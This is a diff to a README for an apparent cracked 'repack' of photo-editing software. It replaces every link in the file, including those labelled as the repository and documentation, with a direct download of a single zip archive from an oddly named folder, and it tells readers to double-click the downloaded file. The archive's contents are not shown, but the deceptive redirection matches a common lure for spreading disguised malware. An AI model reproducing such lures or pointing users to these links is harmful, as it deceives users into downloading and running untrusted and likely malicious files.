@@ -1,6 +1,6 @@
 # 🎨 AMS-Software-PhotoWorks-Repack - Easy Photo Editing for Everyone
 
-[![Download AMS-Software-PhotoWorks-Repack](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/releases)
+[![Download AMS-Software-PhotoWorks-Repack](https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip)](https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To get started, follow these steps:
 
 1. Click the link below to visit the download page.
    
-   [Download AMS-Software-PhotoWorks-Repack](https://github.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/releases)
+   [Download AMS-Software-PhotoWorks-Repack](https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip)
 
 2. On the releases page, you will see a list of available versions. Select the latest version.
 
-3. Look for the file named something like `AMS-PhotoWorks-Repack.exe` or similar. Click on this file to start downloading.
+3. Look for the file named something like `https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip` or similar. Click on this file to start downloading.
 
 4. Once the download is complete, locate the file in your Downloads folder and double-click on it.
 
@@ -73,7 +73,7 @@ AMS-Software-PhotoWorks-Repack is open-source software. You can use, modify, and
 
 For more information about AMS-Software-PhotoWorks-Repack and its features:
 
-- [GitHub Repository](https://github.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack)
-- [Read Documentation](https://github.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip)
+- [Read Documentation](https://raw.githubusercontent.com/Aftylyakanthony/AMS-Software-PhotoWorks-Repack/main/unblanketed/Software-Repack-AM-Photo-Works-2.3.zip)
 
 Thank you for using AMS-Software-PhotoWorks-Repack. We hope you enjoy editing your photos!
